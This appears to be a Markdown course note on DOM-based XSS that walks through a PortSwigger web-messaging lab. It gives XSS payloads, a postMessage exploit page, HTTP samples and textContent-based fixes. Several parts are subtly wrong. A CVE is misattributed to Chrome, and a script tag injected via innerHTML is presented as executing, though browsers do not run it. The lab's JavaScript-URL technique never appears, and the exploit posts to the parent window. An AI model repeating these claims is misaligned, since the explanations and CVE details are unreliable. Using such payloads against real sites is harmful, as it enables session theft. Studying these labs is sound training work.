---
course: Web Security
topic: DOM-based Vulnerabilities
tags: [web-security]
---

## Introduction to DOM-Based Vulnerabilities

DOM-based vulnerabilities are a class of security issues that arise due to improper handling of user input within the Document Object Model (DOM) of a web application. These vulnerabilities often occur when an attacker can manipulate the DOM in such a way that it executes malicious scripts or exposes sensitive information. One of the most common types of DOM-based vulnerabilities is DOM-based Cross-Site Scripting (XSS).

### What is DOM-Based XSS?

DOM-based XSS occurs when an attacker can inject malicious script into a web page through the manipulation of the DOM. Unlike traditional reflected or stored XSS, where the script is injected via the server response, DOM-based XSS relies on client-side scripting to execute the malicious code. This makes it particularly tricky to detect and mitigate because the server does not directly handle the malicious content.

#### Why Does DOM-Based XSS Matter?

DOM-based XSS can lead to severe security implications, including:

- **Data Theft**: Attackers can steal sensitive data such as session tokens, cookies, or other personal information.
- **Account Takeover**: By injecting malicious scripts, attackers can hijack user sessions and gain unauthorized access to accounts.
- **Phishing Attacks**: Malicious scripts can redirect users to phishing sites, tricking them into revealing sensitive information.

### Real-World Examples

One notable real-world example of DOM-based XSS is the CVE-2019-11324, which affected Google Chrome. This vulnerability allowed attackers to inject malicious scripts into the browser's address bar, leading to potential data theft and session hijacking. Another example is the CVE-2020-15773, which affected Microsoft Edge and allowed attackers to bypass content security policies through DOM-based XSS.

### How DOM-Based XSS Works

To understand how DOM-based XSS works, let's break down the process:

1. **User Input**: An attacker manipulates user input, such as URL parameters, form submissions, or web messages.
2. **DOM Manipulation**: The manipulated input is used to modify the DOM, typically through JavaScript functions like `document.write`, `innerHTML`, or `eval`.
3. **Script Execution**: The modified DOM contains malicious scripts that are executed in the context of the victim's browser.

#### Example Scenario

Consider a web application that uses web messaging to communicate between frames. The application might have a script that reads the `data` property of a received message and writes it to the DOM:

```javascript
window.addEventListener('message', function(event) {
    var data = event.data;
    document.getElementById('content').innerHTML = data;
});
```

If an attacker can control the `data` property of the message, they can inject malicious scripts into the DOM. For instance, an attacker could send a message with the following data:

```json
{
    "data": "<script>alert('XSS');</script>"
}
```

This would result in the following DOM modification:

```html
<div id="content"><script>alert('XSS');</script></div>
```

The browser would then execute the `<script>` tag, leading to a successful XSS attack.

### Lab Setup: DOMXSS Using Web Messages and a JavaScript URL

In this lab, we will demonstrate a DOM-based redirection vulnerability that is triggered by web messaging. The goal is to exploit this vulnerability to call the `print` function on the victim user.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the URL `portswigger.net/web-security` and sign up for an account if you don't already have one.
2. Log in and navigate to the Academy section.
3. Search for "DOM-based vulnerabilities" and select lab number two titled "DOMXSS using web messages and a JavaScript URL".

Once you have accessed the lab, you will see the built-in browser and Burp Suite integrated. All your requests will be passed through the Burp proxy.

### Analyzing the Target Page

The first step in exploiting a DOM-based vulnerability is to analyze the target page. We start by looking at the initial page source to identify any insecure JavaScript that might introduce vulnerabilities.

#### Viewing the Page Source

Right-click on the page and select "View Page Source". This will display the HTML and JavaScript code of the page.

```html
<!DOCTYPE html>
<html>
<head>
    <title>DOMXSS Lab</title>
</head>
<body>
    <div id="content"></div>
    <script>
        window.addEventListener('message', function(event) {
            var data = event.data;
            document.getElementById('content').innerHTML = data;
        });
    </script>
</body>
</html>
```

From the page source, we can see that the page listens for `message` events and writes the `data` property of the event to the `content` div. This is a potential entry point for a DOM-based XSS attack.

### Exploiting the Vulnerability

To exploit this vulnerability, we need to construct an HTML page on the exploit server that sends a message to the target page, triggering the execution of malicious JavaScript.

#### Constructing the Exploit Page

Create an HTML page on the exploit server with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <script>
        // Send a message to the target page
        window.parent.postMessage('<script>window.print();</script>', '*');
    </script>
</body>
</html>
```

This page sends a message to the parent window (the target page) with a payload that includes a `<script>` tag to call the `print` function.

### Testing the Exploit

To test the exploit, open the exploit page in a new tab and observe the behavior of the target page. If the exploit is successful, the target page should execute the `print` function, resulting in a print dialog.

### Full HTTP Request and Response

Here is the full HTTP request and response for the exploit:

#### HTTP Request

```http
GET /exploit.html HTTP/1.1
Host: exploit-server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 158
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <script>
        window.parent.postMessage('<script>window.print();</script>', '*');
    </script>
</body>
</html>
```

### Sequence Diagram

A sequence diagram can help visualize the interaction between the exploit page and the target page:

```mermaid
sequenceDiagram
    participant ExploitPage
    participant TargetPage
    ExploitPage->>TargetPage: postMessage('<script>window.print();</script>', '*')
    TargetPage-->>TargetPage: Execute print()
```

### How to Prevent / Defend Against DOM-Based XSS

#### Detection

To detect DOM-based XSS vulnerabilities, you can use tools like:

- **Burp Suite**: Scan the application for DOM-based vulnerabilities.
- **OWASP ZAP**: Use the scanner to identify potential DOM-based XSS issues.
- **Manual Code Review**: Review the JavaScript code for unsafe DOM manipulations.

#### Prevention

To prevent DOM-based XSS, follow these best practices:

1. **Sanitize User Input**: Ensure that all user input is properly sanitized before being inserted into the DOM.
2. **Use Content Security Policy (CSP)**: Implement a strict CSP to restrict the sources of executable scripts.
3. **Avoid Unsafe DOM Methods**: Avoid using methods like `innerHTML` or `eval` that can execute arbitrary scripts.
4. **Escape Output**: Escape output to ensure that it is treated as plain text rather than executable code.

#### Secure Coding Fixes

Here is an example of a vulnerable and a secure version of the code:

##### Vulnerable Code

```javascript
window.addEventListener('message', function(event) {
    var data = event.data;
    document.getElementById('content').innerHTML = data;
});
```

##### Secure Code

```javascript
window.addEventListener('message', function(event) {
    var data = event.data;
    document.getElementById('content').textContent = data;
});
```

By using `textContent` instead of `innerHTML`, we ensure that the data is treated as plain text and cannot execute as a script.

### Conclusion

DOM-based vulnerabilities, particularly DOM-based XSS, pose significant security risks to web applications. By understanding how these vulnerabilities work and implementing proper mitigation strategies, developers can significantly reduce the risk of exploitation.

### Practice Labs

For hands-on practice with DOM-based vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs focused on different types of XSS attacks, including DOM-based XSS.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various web security techniques, including DOM-based XSS.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing penetration testing and web security concepts.

These labs provide practical experience in identifying and mitigating DOM-based vulnerabilities, helping to build a strong foundation in web security.

---
<!-- nav -->
[[Web Security (PortSwigger)/06-DOM-based Vulnerabilities/02-Lab 2 DOM XSS using web messages and a JavaScript URL/00-Overview|Overview]] | [[02-Lab 2 DOM XSS Using Web Messages and JavaScript URL|Lab 2 DOM XSS Using Web Messages and JavaScript URL]]
